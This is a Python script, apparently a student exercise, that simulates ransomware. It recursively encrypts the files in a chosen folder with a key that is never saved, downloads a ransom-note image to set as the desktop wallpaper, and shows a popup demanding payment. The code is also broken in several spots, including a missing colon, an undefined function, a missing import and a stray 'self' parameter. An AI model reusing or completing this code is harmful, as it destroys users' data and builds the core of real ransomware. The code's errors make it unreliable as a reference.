#!bin/bash/env python3

# Script Name:                 FileEncryptionScriptPart3
# Author:                       Cody Blahnik
# Date of latest revision:      3/8/24
# Purpose:                      Encrypt files with ransomware simulation options

# Import necessary modules
from cryptography.fernet import Fernet  # Import the Fernet class from the cryptography.fernet module
import os  # Import the os module
import ctypes  # Import ctypes for Windows API calls
import urllib.request # used for downloading and saving background image

# Generate a key using Fernet
key = Fernet.generate_key()

# Assign the key to cipher_suite
cipher_suite = Fernet(key)

# Function to encrypt a file
def encrypt_file(file_path):
    # Open the file in binary mode for reading
    with open(file_path, 'rb') as f:
        plaintext = f.read()
    # Encrypts text
    encrypted_text = cipher_suite.encrypt(plaintext)
    # Open the file
    with open(file_path, 'wb') as f:
        f.write(encrypted_text)

# Function to decrypt a file
def decrypt_file(file_path):
    # Open the file in binary mode for reading
    with open(file_path, 'rb') as f:
        # Read the encrypted text from the file
        encrypted_text = f.read()
    # Decrypt the encrypted text using the cipher_suite
    decrypted_text = cipher_suite.decrypt(encrypted_text)
    # Open the file in binary mode for writing
    with open(file_path, 'wb') as f:
        # Write the decrypted text back to the file
        f.write(decrypted_text)

# Function to recursively encrypt a folder 
def encrypt_folder(folder_path):
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            # Call function to encrypt file
            encrypt_file(file_path)

# Function to recursively decrypt a folder that was encrypted by this tool
def decrypt_folder(folder_path) 
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            # Call function
            decrypt_file(file_path)

def change_desktop_background(self):
        imageUrl = 'https://www.google.com/imgres?q=ransomware&imgurl=https%3A%2F%2Fcdn.britannica.com%2F97%2F242197-050-EDCA49EA%2Ftext-ransomware-message.jpg&imgrefurl=https%3A%2F%2Fwww.britannica.com%2Ftechnology%2Fransomware&docid=zFLdUMdOr5x40M&tbnid=9DCmvDUOnLX6NM&vet=12ahUKEwiV1-aH7v6FAxVI4ckDHa1dDdIQM3oECCoQAA..i&w=790&h=560&hcb=2&ved=2ahUKEwiV1-aH7v6FAxVI4ckDHa1dDdIQM3oECCoQAA'
        # Go to specif url and download+save image using absolute path
        path = f'{self.sysRoot}Desktop/background.jpg'
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        # Access windows dlls for funcionality eg, changing dekstop wallpaper
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

# Function to create ransomware popup window
def create_popup(message):
    root = tk.Tk()
    root.title("Ransomware Alert")
    label = tk.Label(root, text=message)
    label.pack()
    root.mainloop()

# Main function for user input
def main():
    # Print options for user
    print("Select a mode:")
    print("1. Encrypt a file")
    print("2. Decrypt a file")
    print("3. Encrypt a folder (and its contents)")
    print("4. Decrypt a folder (previously encrypted by this tool)")
    print("5. Ransomware simulation (Alter desktop wallpaper and popup window)")
    
    # Prompts user to enter a mode
    mode = input("Enter mode: ")
    
    # Check the mode
    if mode == '1':
        file_path = input("Enter the file path: ")
        if os.path.exists(file_path):
            encrypt_file(file_path)
            print("File encrypted successfully.")
        else:
            print("File not found.")
    elif mode == '2':
        file_path = input("Enter the file path: ")
        if os.path.exists(file_path):
            decrypt_file(file_path)
            print("File decrypted successfully.")
        else:
            print("File not found.")
    elif mode == '3':
        folder_path = input("Enter the folder path: ")
        if os.path.exists(folder_path):
            encrypt_folder(folder_path)
            print("Folder and its contents encrypted successfully.")
        else:
            print("Folder not found.")
    elif mode == '4':
        folder_path = input("Enter the folder path: ")
        if os.path.exists(folder_path):
            decrypt_folder(folder_path)
            print("Folder and its contents decrypted successfully.")
        else:
            print("Folder not found.")
    elif mode == '5':
        ransomware_option = input("Would you like to simulate ransomware? (y/n): ")
        if ransomware_option.lower() == 'y':
            wallpaper_path = "path_to_your_ransomware_wallpaper.jpg"
            set_wallpaper(wallpaper_path)
            print("Desktop wallpaper altered. Ransomware message displayed.")
            
            message = "Your files have been encrypted. Pay the ransom to get them back."
            create_popup(message)
            print("Ransomware message displayed in popup window.")
        else:
            print("Ransomware simulation canceled.")
    else:
        print("Invalid mode.")

if __name__ == "__main__":
    main()
